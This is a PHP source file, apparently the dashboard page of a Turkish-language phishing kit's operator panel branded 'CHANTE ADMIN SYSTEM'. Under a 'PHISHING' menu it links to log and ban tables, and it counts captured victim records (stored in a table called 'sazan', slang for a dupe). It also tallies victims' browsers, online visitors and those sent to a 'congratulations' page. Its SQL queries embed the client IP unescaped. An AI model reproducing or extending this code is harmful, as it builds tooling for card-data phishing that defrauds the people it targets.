<?php 
   date_default_timezone_set('Europe/Istanbul');
   include("../mysql.php");
   include("core/getRealIPAdress.php");
   include("core/browserDetect.php");

   $mysqli = $_SESSION['mysqli'];
   $ip = getUserIP();
   
   $logSQL = mysqli_query($mysqli, "SELECT * FROM sazan");
   $logSayisi = mysqli_num_rows($logSQL);
   
   $banSQL = mysqli_query($mysqli, "SELECT * FROM ban");
   $banSayisi = mysqli_num_rows($banSQL);
   
   mysqli_query($mysqli, "UPDATE paneldekiler SET durum = 'Anasayfa' WHERE ip = '{$ip}'");
   if(!isset($_SESSION["login"])){
     mysqli_query($mysqli, "DELETE FROM paneldekiler WHERE ip='$ip'");
     header('Location:login.php');
   }else{
   if(isset($_GET['logout'])){
     session_start();
     ob_start();
     session_unset();
     session_destroy();
     mysqli_query($mysqli, "DELETE FROM paneldekiler WHERE ip='$ip'");
     header('Location:login.php');
   }

   $chromesql = mysqli_query($mysqli, "SELECT * FROM sazan WHERE tarayici='Google Chrome'");
   $chrome = mysqli_num_rows($chromesql);

   $operasql = mysqli_query($mysqli, "SELECT * FROM sazan WHERE tarayici='Opera'");
   $opera = mysqli_num_rows($operasql);

   $iesql = mysqli_query($mysqli, "SELECT * FROM sazan WHERE tarayici='Internet Explorer'");
   $ie = mysqli_num_rows($iesql);

   $firefoxsql = mysqli_query($mysqli, "SELECT * FROM sazan WHERE tarayici='Mozilla Firefox'");
   $firefox = mysqli_num_rows($firefoxsql);

   $safarisql = mysqli_query($mysqli, "SELECT * FROM sazan WHERE tarayici='Safari'");
   $safari = mysqli_num_rows($safarisql);
?>
<!doctype html>
<html lang="tr" dir="ltr">
   <head>
      <!-- META DATA -->
      <meta charset="UTF-8">
      <meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=0'>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="description" content="CHANTE ADMIN SYSTEM">
      <meta name="author" content="Chante">
      <!-- TITLE -->
      <title>CHANTE ADMIN SYSTEM</title>
      <!-- BOOTSTRAP CSS -->
      <link id="style" href="assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
      <!-- STYLE CSS -->
      <link href="assets/css/style.css" rel="stylesheet" />
      <link href="assets/css/dark-style.css" rel="stylesheet" />
      <link href="assets/css/skin-modes.css" rel="stylesheet" />
      <!--- FONT-ICONS CSS -->
      <link href="assets/css/icons.css" rel="stylesheet" />
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" rel="stylesheet" />
      <!-- COLOR SKIN CSS -->
      <link id="theme" rel="stylesheet" type="text/css" media="all" href="assets/colors/color1.css" />
      <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
      <script>
         $(document).ready(function() {
             setInterval(function() {
                 $("#tablo").load(window.location.href + " #tablo");
             }, 3000);
         }); 
         $(document).ready(function() {
             setInterval(function() {
                 $("#sayi1").load(window.location.href + " #sayi1");
             }, 5000);
         });
         $(document).ready(function() {
             setInterval(function() {
                 $("#sayi2").load(window.location.href + " #sayi2");
             }, 5000);
         });
         $(document).ready(function() {
             setInterval(function() {
                 $("#sayi3").load(window.location.href + " #sayi3");
             }, 5000);
         });
         $(document).ready(function() {
             setInterval(function() {
                 $("#sayi4").load(window.location.href + " #sayi4");
             }, 5000);
         });
      </script>
   </head>
   <body class="app sidebar-mini ltr dark-mode">
      <!-- PAGE -->
      <div class="page">
         <div class="page-main">
            <!-- app-Header -->
            <div class="app-header header sticky">
               <div class="container-fluid main-container">
                  <div class="d-flex">
                     <a aria-label="Hide Sidebar" class="app-sidebar__toggle" data-bs-toggle="sidebar" href=""></a>
                     <!-- sidebar-toggle-->
                     <a class="logo-horizontal">
                     <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img desktop-logo" alt="logo">
                     <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img light-logo1" alt="logo">
                     </a>
                     <!-- LOGO -->
                     <div class="d-flex order-lg-2 ms-auto header-right-icons">
                        <button class="navbar-toggler navresponsive-toggler d-lg-none ms-auto" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent-4" aria-controls="navbarSupportedContent-4" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon fe fe-more-vertical"></span>
                        </button>
                        <div class="navbar navbar-collapse responsive-navbar p-0">
                           <div class="collapse navbar-collapse" id="navbarSupportedContent-4">
                              <div class="d-flex order-lg-2">
                                 <div class="dropdown  d-flex">
                                    <a class="nav-link icon theme-layout nav-link-bg layout-setting">
                                    <span class="dark-layout">
                                    <i class="fe fe-moon"></i>
                                    </span>
                                    <span class="light-layout">
                                    <i class="fe fe-sun"></i>
                                    </span>
                                    </a>
                                 </div>
                                 <!-- Theme-Layout -->
                                 <div class="dropdown d-flex">
                                    <a class="nav-link icon full-screen-link nav-link-bg">
                                    <i class="fe fe-minimize fullscreen-button"></i>
                                    </a>
                                 </div>
                                 <!-- FULL-SCREEN -->
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <!-- /app-Header -->
            <!--APP-SIDEBAR-->
            <div class="sticky">
               <div class="app-sidebar__overlay" data-bs-toggle="sidebar"></div>
               <div class="app-sidebar">
                  <div class="side-header">
                     <a class="header-brand1">
                     <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img desktop-logo" alt="logo">
                     <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img light-logo" alt="logo">
                     <img src="../assets/img/1.png" style="width: 150px;" class="header-brand-img light-logo1" alt="logo">
                     </a>
                     <!-- LOGO -->
                  </div>
                  <div class="main-sidemenu">
                     <div class="slide-left disabled" id="slide-left">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191" width="24" height="24" viewBox="0 0 24 24">
                           <path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z" />
                        </svg>
                     </div>
                     <ul class="side-menu">
                        <li class="sub-category">
                           <h3>Panel</h3>
                        </li>
                        <li class="slide">
                           <a class="side-menu__item" data-bs-toggle="slide" href="index.php">
                           <i class="side-menu__icon fe fe-home"></i>
                           <span class="side-menu__label">Anasayfa</span>
                           </a>
                        </li>
                        <li class="sub-category">
                           <h3>PHISHING</h3>
                        </li>
                        <li class="slide">
                           <a class="side-menu__item" data-bs-toggle="slide" href="logtablosu.php">
                           <i class="side-menu__icon fa-brands fa-cc-visa"></i>
                           <span class="side-menu__label">Log Tablosu</span>
                           </a>
                           <a class="side-menu__item" data-bs-toggle="slide" href="bantablosu.php">
                           <i class="side-menu__icon fa-solid fa-ban"></i>
                           <span class="side-menu__label">Ban Tablosu</span>
                           </a>
                        </li>
                        <li class="sub-category">
                           <h3>Genel</h3>
                        </li>
                        <li class="slide">
                           <a class="side-menu__item" data-bs-toggle="slide" href="reklamtaramasi.php">
                           <i class="side-menu__icon fe fe-chrome"></i>
                           <span class="side-menu__label">Reklam Taraması</span>
                           <span class="badge bg-green side-badge">Yeni</span>
                           </a>
                        </li>
                        <li class="sub-category">
                           <h3>Ayarlar</h3>
                        </li>
                        <li class="slide">
                           <a class="side-menu__item" data-bs-toggle="slide" href="panelayarlari.php">
                           <i class="side-menu__icon fe fe-settings"></i>
                           <span class="side-menu__label">Panel Ayarları</span>
                           </a>
                           <a class="side-menu__item" data-bs-toggle="slide" href="?logout">
                           <i class="side-menu__icon fe fe-log-out"></i>
                           <span class="side-menu__label">Çıkış Yap</span>
                           </a>
                        </li>
                     </ul>
                     <div class="slide-right" id="slide-right">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191" width="24" height="24" viewBox="0 0 24 24">
                           <path d="M10.707 17.707 16.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z" />
                        </svg>
                     </div>
                  </div>
               </div>
               <!--/APP-SIDEBAR-->
            </div>
            <!--app-content open-->
            <div class="main-content app-content mt-0">
               <div class="side-app">
                  <!-- CONTAINER -->
                  <div class="main-container container-fluid">
                     <!-- PAGE-HEADER -->
                     <div class="page-header">
                        <h1 class="page-title">Anasayfa</h1>
                        <div>
                           <ol class="breadcrumb">
                              <li class="breadcrumb-item">
                                 <a href="">Panel</a>
                              </li>
                              <li class="breadcrumb-item active" aria-current="page">Anasayfa</li>
                           </ol>
                        </div>
                     </div>
                     <!-- PAGE-HEADER END -->
                     <!-- ROW-1 -->
                     <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xl-12">
                           <div class="row">
                              <div class="col-lg-6 col-md-6 col-sm-12 col-xl-3">
                                 <div class="card overflow-hidden">
                                    <div class="card-body">
                                       <div id="sayi1" class="d-flex">
                                          <div class="mt-2">
                                             <h6 class="">
                                                <i class="fe fe-credit-card text-secondary"></i> Log Sayısı
                                             </h6>
                                             <h2 class="mb-0 number-font"> <?php echo $logSayisi ?> </h2>
                                          </div>
                                          <div class="ms-auto">
                                             <div class="chart-wrapper mt-1">
                                                <canvas id="saleschart" class="h-8 w-9 chart-dropshadow"></canvas>
                                             </div>
                                          </div>
                                       </div>
                                       <span class="text-muted fs-12">Burada Toplam Gelen <span class="text-secondary"> Logların</span> Sayısı Vardır </span>
                                    </div>
                                 </div>
                              </div>
                              <div class="col-lg-6 col-md-6 col-sm-12 col-xl-3">
                                 <div class="card overflow-hidden">
                                    <div class="card-body">
                                       <div id="sayi2" class="d-flex">
                                          <div class="mt-2">
                                             <h6 class="">
                                                <i class="fe fe-wifi text-green"></i> Çevrimiçi Sayısı
                                             </h6>
                                             <h2 class="mb-0 number-font"> <?php $onlineList = []; $query = mysqli_query($mysqli, "SELECT * FROM ips"); if(mysqli_num_rows($query)) {foreach($query as $v) {if($v['lastOnline'] > time()) {array_push($onlineList, $v['ipAddress']);}}}echo count($onlineList); ?> </h2>
                                          </div>
                                          <div class="ms-auto">
                                             <div class="chart-wrapper mt-1">
                                                <canvas id="leadschart" class="h-8 w-9 chart-dropshadow"></canvas>
                                             </div>
                                          </div>
                                       </div>
                                       <span class="text-muted fs-12">Burada Çevrimiçi Olan <span class="text-green"> Ziyaretçilerin</span> Sayısı Vardır </span>
                                    </div>
                                 </div>
                              </div>
                              <div class="col-lg-6 col-md-6 col-sm-12 col-xl-3">
                                 <div class="card overflow-hidden">
                                    <div class="card-body">
                                       <div id="sayi3" class="d-flex">
                                          <div class="mt-2">
                                             <h6 class="">
                                                <i class="fe fe-alert-triangle text-red"></i> Yasaklanan Sayısı
                                             </h6>
                                             <h2 class="mb-0 number-font"> <?php echo $banSayisi ?> </h2>
                                          </div>
                                          <div class="ms-auto">
                                             <div class="chart-wrapper mt-1">
                                                <canvas id="profitchart" class="h-8 w-9 chart-dropshadow"></canvas>
                                             </div>
                                          </div>
                                       </div>
                                       <span class="text-muted fs-12">Burada Yasaklanan <span class="text-red"> Ziyaretçilerin</span> Sayısı Vardır </span>
                                    </div>
                                 </div>
                              </div>
                              <div class="col-lg-6 col-md-6 col-sm-12 col-xl-3">
                                 <div class="card overflow-hidden">
                                    <div class="card-body">
                                       <div id="sayi4" class="d-flex">
                                          <div class="mt-2">
                                             <h6 class="">
                                                <i class="fe fe-dollar-sign text-yellow"></i> Tebriklenen Sayısı
                                             </h6>
                                             <h2 class="mb-0 number-font"> <?php $tebrikList = [];$query = mysqli_query($mysqli, "SELECT * FROM sazan"); if(mysqli_num_rows($query)) {foreach($query as $v) {if($v['now'] === 'Tebrik Sayfası') {array_push($tebrikList, $v['now']);}}}echo count($tebrikList);?> </h2>
                                          </div>
                                          <div class="ms-auto">
                                             <div class="chart-wrapper mt-1">
                                                <canvas id="costchart" class="h-8 w-9 chart-dropshadow"></canvas>
                                             </div>
                                          </div>
                                       </div>
                                       <span class="text-muted fs-12">Burada Tebriklenen <span class="text-yellow"> Ziyaretçilerin</span> Sayısı Vardır </span>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <!-- ROW-1 END -->
                     <!-- ROW-3 -->
                     <div class="row">
                        <div class="col-xl-6 col-lg-6 col-md-12">
                           <div class="card">
                              <div class="card-header">
                                 <h4 class="card-title fw-semibold">Panele Giriş Yapanlar</h4>
                              </div>
                              <div class="card-body">
                                 <div id="tablo" class="table-responsive">
                                    <table class="table border text-nowrap text-md-nowrap table-striped mb-0">
                                       <thead>
                                          <tr>
                                             <th>IP ADRESI</th>
                                             <th>DURUM</th>
                                             <th>TARAYICI</th>
                                             <th>TARIH</th>
                                          </tr>
                                       </thead>
                                       <?php $sqla=mysqli_query($mysqli, 'SELECT * FROM paneldekiler ORDER BY ip DESC'); ?> 
                                       <tbody>
                                          <?php foreach($sqla as $oku) { ?> 
                                          <tr>
                                             <td>
                                                <b> <?php echo $oku['ip']; ?> </b>
                                             </td>
                                             <td>
                                                <b> <?php echo $oku['durum']; ?> </b>
                                             </td>
                                             <td>
                                                <b> <?php echo $oku['tarayici']; ?> </b>
                                             </td>
                                             <td>
                                                <b> <?php echo $oku['tarih']; ?> </b>
                                             </td>
                                          </tr>
                                          <?php } ?> 
                                       </tbody>
                                    </table>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="col-xl-6 col-lg-6 col-md-12">
                           <div class="card">
                              <div class="card-header">
                                 <h4 class="card-title fw-semibold">Tarayıcı Kullanımı</h4>
                              </div>
                              <div class="card-body">
                                 <div class="browser-stats">
                                    <div class="row mb-4">
                                       <div class="col-sm-2 col-lg-3 col-xl-3 col-xxl-2 mb-sm-0 mb-3">
                                          <img src="assets/images/browsers/chrome.svg" class="img-fluid" alt="img">
                                       </div>
                                       <div class="col-sm-10 col-lg-9 col-xl-9 col-xxl-10 ps-sm-0">
                                          <div class="d-flex align-items-end justify-content-between mb-1">
                                             <h6 class="mb-1">Chrome</h6>
                                             <h6 class="fw-semibold mb-1"><?php echo $chrome; ?> Kişi</h6>
                                          </div>
                                          <div class="progress h-2 mb-3">
                                             <div class="progress-bar bg-primary" style="width: <?php echo $chrome; ?>%;" role="progressbar"></div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row mb-4">
                                       <div class="col-sm-2 col-lg-3 col-xl-3 col-xxl-2 mb-sm-0 mb-3">
                                          <img src="assets/images/browsers/opera.svg" class="img-fluid" alt="img">
                                       </div>
                                       <div class="col-sm-10 col-lg-9 col-xl-9 col-xxl-10 ps-sm-0">
                                          <div class="d-flex align-items-end justify-content-between mb-1">
                                             <h6 class="mb-1">Opera</h6>
                                             <h6 class="fw-semibold mb-1"><?php echo $opera; ?> Kişi</h6>
                                          </div>
                                          <div class="progress h-2 mb-3">
                                             <div class="progress-bar bg-secondary" style="width: <?php echo $opera; ?>%;" role="progressbar"></div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row mb-4">
                                       <div class="col-sm-2 col-lg-3 col-xl-3 col-xxl-2 mb-sm-0 mb-3">
                                          <img src="assets/images/browsers/ie.svg" class="img-fluid" alt="img">
                                       </div>
                                       <div class="col-sm-10 col-lg-9 col-xl-9 col-xxl-10 ps-sm-0">
                                          <div class="d-flex align-items-end justify-content-between mb-1">
                                             <h6 class="mb-1">IE</h6>
                                             <h6 class="fw-semibold mb-1"><?php echo $ie; ?> Kişi</h6>
                                          </div>
                                          <div class="progress h-2 mb-3">
                                             <div class="progress-bar bg-success" style="width: <?php echo $ie; ?>%;" role="progressbar"></div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row mb-4">
                                       <div class="col-sm-2 col-lg-3 col-xl-3 col-xxl-2 mb-sm-0 mb-3">
                                          <img src="assets/images/browsers/firefox.svg" class="img-fluid" alt="img">
                                       </div>
                                       <div class="col-sm-10 col-lg-9 col-xl-9 col-xxl-10 ps-sm-0">
                                          <div class="d-flex align-items-end justify-content-between mb-1">
                                             <h6 class="mb-1">Firefox</h6>
                                             <h6 class="fw-semibold mb-1"><?php echo $firefox; ?> Kişi</h6>
                                          </div>
                                          <div class="progress h-2 mb-3">
                                             <div class="progress-bar bg-danger" style="width: <?php echo $firefox; ?>%;" role="progressbar"></div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row mb-4">
                                       <div class="col-sm-2 col-lg-3 col-xl-3 col-xxl-2 mb-sm-0 mb-3">
                                          <img src="assets/images/browsers/safari.svg" class="img-fluid" alt="img">
                                       </div>
                                       <div class="col-sm-10 col-lg-9 col-xl-9 col-xxl-10 ps-sm-0">
                                          <div class="d-flex align-items-end justify-content-between mb-1">
                                             <h6 class="mb-1">Safari</h6>
                                             <h6 class="fw-semibold mb-1"><?php echo $safari; ?> Kişi</h6>
                                          </div>
                                          <div class="progress h-2 mb-3">
                                             <div class="progress-bar bg-info" style="width: <?php echo $safari; ?>%;" role="progressbar"></div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <!-- ROW-3 END -->
                  </div>
                  <!-- CONTAINER END -->
               </div>
            </div>
            <!--app-content close-->
         </div>
         <!-- FOOTER -->
         <footer class="footer">
            <div class="container">
               <div class="row align-items-center flex-row-reverse">
                  <div class="col-md-12 col-sm-12 text-center"> Copyright © 2022 <a href="https://icq.im/Chante">Chante</a></div>
               </div>
            </div>
         </footer>
         <!-- FOOTER END -->
      </div>
      <!-- BACK-TO-TOP -->
      <a href="#top" id="back-to-top">
      <i class="fa fa-angle-up"></i>
      </a>
      <!-- JQUERY JS -->
      <script src="assets/js/jquery.min.js"></script>
      <!-- BOOTSTRAP JS -->
      <script src="assets/plugins/bootstrap/js/popper.min.js"></script>
      <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script>
      <!-- SIDEBAR JS -->
      <script src="assets/plugins/sidebar/sidebar.js"></script>
      <!-- SIDE-MENU JS-->
      <script src="assets/plugins/sidemenu/sidemenu.js"></script>
      <!-- INTERNAL INDEX JS -->
      <script src="assets/js/index1.js"></script>
      <!-- Perfect SCROLLBAR JS-->
      <script src="assets/plugins/p-scroll/perfect-scrollbar.js"></script>
      <script src="assets/plugins/p-scroll/pscroll.js"></script>
      <script src="assets/plugins/p-scroll/pscroll-1.js"></script>
      <!-- Color Theme js -->
      <script src="assets/js/themeColors.js"></script>
      <!-- Sticky js -->
      <script src="assets/js/sticky.js"></script>
      <!-- CUSTOM JS -->
      <script src="assets/js/custom.js"></script>
   </body>
</html>
<?php } ?>